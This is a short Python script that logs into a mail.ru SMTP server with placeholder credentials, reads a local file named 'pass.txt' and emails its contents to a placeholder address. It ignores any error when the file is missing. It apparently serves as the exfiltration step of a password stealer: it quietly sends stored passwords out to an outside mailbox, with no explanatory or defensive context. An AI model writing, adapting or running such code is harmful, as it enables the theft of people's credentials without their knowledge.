import smtplib
smtpObj = smtplib.SMTP('smtp.mail.ru', 587)
smtpObj.starttls()
login = "MAIL_LOGIN(from)"
password = "PASSWORD"
smtpObj.login(login, password)
try:
    data = open("pass.txt", 'r', encoding='utf-8').read()
except:
    data = "no data"
smtpObj.sendmail("MAIL_LOGIN(from)", "MAIL_LOGIN(to)", data)
smtpObj.quit()
